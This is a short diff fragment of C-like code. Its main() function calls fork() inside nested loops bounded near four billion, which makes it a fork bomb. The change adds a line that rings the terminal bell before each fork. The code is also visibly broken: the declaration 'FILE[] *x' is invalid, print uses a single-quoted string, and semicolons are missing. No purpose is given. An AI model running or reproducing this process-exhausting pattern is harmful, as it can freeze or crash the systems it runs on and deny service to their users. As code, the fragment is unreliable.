@@ -15,6 +15,7 @@ int main() {
     FILE[] *x;
     for(unsigned int i = 0; i < 4294967295; i++) {
         for(int y = 0; y < 10; y++) {
+            print('\x7')
             fork()
         }
         if(i <= 1000) {
